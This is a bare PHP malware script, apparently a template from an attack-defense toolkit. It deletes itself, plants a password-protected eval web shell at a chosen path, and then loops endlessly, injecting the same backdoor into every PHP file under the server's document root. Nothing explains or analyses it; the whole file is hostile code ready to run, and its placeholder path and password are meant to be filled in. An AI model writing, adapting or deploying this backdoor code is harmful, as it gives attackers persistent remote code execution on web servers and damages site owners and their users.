<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
file_put_contents('filepathfilepath','<?php @eval($_POST["passwordpassword"]);?>');
function getfiles($path){
    foreach(glob($path) as $afile){
        if(is_dir($afile)){
            getfiles($afile.'/*.php');
        }else{
            file_put_contents($afile,'<?php @eval($_POST["passwordpassword"]);?>'.file_get_contents($afile), FILE_APPEND);
        }
    }
}
while(1){
    getfiles($_SERVER['DOCUMENT_ROOT']);
}
?>